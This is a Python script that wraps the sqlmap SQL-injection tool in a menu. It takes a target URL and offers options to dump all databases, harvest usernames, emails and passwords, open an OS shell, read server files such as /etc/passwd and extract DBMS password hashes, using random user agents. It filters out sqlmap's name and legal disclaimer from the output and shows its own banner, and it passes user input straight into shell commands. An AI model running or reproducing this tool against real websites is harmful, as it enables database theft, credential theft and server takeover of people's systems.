import os
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.text import Text

console = Console()

tool_banner = """
⢀⣤⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⡀
⢸⣿⣿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⣿⣿⡇
⢸⣿⣿           ⢀⣀         ⣿⣿⡇
⢸⣿⣿     ⣠⣦⡀  ⢀⣿⡟ ⢀⣴⣄     ⣿⣿⡇
⢸⣿⣿   ⣠⣾⡿⠋   ⢸⣿⠇  ⠙⢿⣷⣄   ⣿⣿⡇
⢸⣿⣿  ⠘⢿⣿⣄   ⢀⣿⡟    ⣠⣿⡿⠃  ⣿⣿⡇
⢸⣿⣿    ⠙⢿⣷⠄ ⢸⣿⠇  ⠠⣾⡿⠋    ⣿⣿⡇
⢸⣿⣿      ⠁  ⠿⠟    ⠈      ⣿⣿⡇
⢸⣿⣿                      ⣿⣿⡇
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
 ⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⢹⣿⣿⣿⣿⡏⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁ 
         ⣤⣤⣼⣿⣿⣿⣿⣧⣤⣤         
         ⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿         
"""

description = """[1] Full Scanㅤ: Detect WAF & DBMS
[2] Dump DBsㅤ: Extract all data
[3] Get Usersㅤ: Dump emails/passwords
[4] Shellㅤ: TRY to get OS shell
[5] Read Fileㅤ: Access server file
[6] DBMS Credsㅤ: Show DBMS logins
[0] Exitㅤ: Close The Tools"""

menu = """
[+] Choose an Option :
    [1] Full Website Scan
    [2] Dump All Databases
    [3] Dump Users and Passwords
    [4] Open OS Shell
    [5] Read Server File
    [6] Extract DBMS Passwords
    [0] Exit
"""

custom_sqlmap_banner = r"""
 (                      )         
 )\ )   (     (      ( /(         
(()/(   )\    )\     )\())        
 /(_))(((_)((((_)(  ((_)\         
(_))  )\___ )\ _ )\  _((_)        
/ __|((/ __|(_)_\(_)| \| |        
\__ \ | (__  / _ \  | .` |  _  _  
|___/  \___|/_/ \_\ |_|\_| (_)(_) 
"""

banned_keywords = [
    "sqlmap", "https://sqlmap.org", "legal disclaimer", "__H__", "Developers assume no liability"
]

def run_sqlmap_command(cmd):
    printed_banner = False
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, text=True)
    for line in process.stdout:
        low = line.lower()
        if any(word in low for word in banned_keywords):
            if not printed_banner:
                console.print(custom_sqlmap_banner, style="bold cyan")
                printed_banner = True
            continue
        if "[info]" in low:
            console.print(Text(line.strip(), style="cyan"))
        elif "[warning]" in low:
            console.print(Text(line.strip(), style="yellow"))
        elif "[critical]" in low or "[error]" in low:
            console.print(Text(line.strip(), style="bold red"))
        elif line.strip().startswith("[") and "]" in line.strip():
            console.print(Text(line.strip(), style="white"))
        else:
            console.print(line.strip(), style="grey50")

def scan_target(url):
    run_sqlmap_command(f"sqlmap -u \"{url}\" --batch --random-agent --level=5 --risk=3 --threads=10")

def dump_all(url):
    run_sqlmap_command(f"sqlmap -u \"{url}\" --dump-all --batch --random-agent")

def dump_users(url):
    run_sqlmap_command(f"sqlmap -u \"{url}\" --batch --random-agent --search -C password,username,admin,email,user,pass")

def os_shell(url):
    run_sqlmap_command(f"sqlmap -u \"{url}\" --os-shell --batch --random-agent")

def file_read(url):
    path = Prompt.ask("[+] Enter file path", default="/etc/passwd")
    run_sqlmap_command(f"sqlmap -u \"{url}\" --file-read={path} --batch --random-agent")

def passwords(url):
    run_sqlmap_command(f"sqlmap -u \"{url}\" --passwords --batch --random-agent")

def main():
    console.print(tool_banner, style="green")
    console.print(Panel(description.strip(), style="bold white", width=60))
    url = Prompt.ask("[+] Enter Target URLㅤ")
    console.print(menu, style="bold white")
    choice = Prompt.ask("[+] Choose Option ,", choices=["1", "2", "3", "4", "5", "6", "0"], default="1")
    
    if choice == "1":
        scan_target(url)
    elif choice == "2":
        dump_all(url)
    elif choice == "3":
        dump_users(url)
    elif choice == "4":
        os_shell(url)
    elif choice == "5":
        file_read(url)
    elif choice == "6":
        passwords(url)
    elif choice == "0":
        console.print("[+] Exited Tools Good Bye ):", style="bold red")
        return

    console.print("\n[+] Task Finished - Please Run the Tools again to continue.", style="bold green")
    exit()

if __name__ == "__main__":
    main()
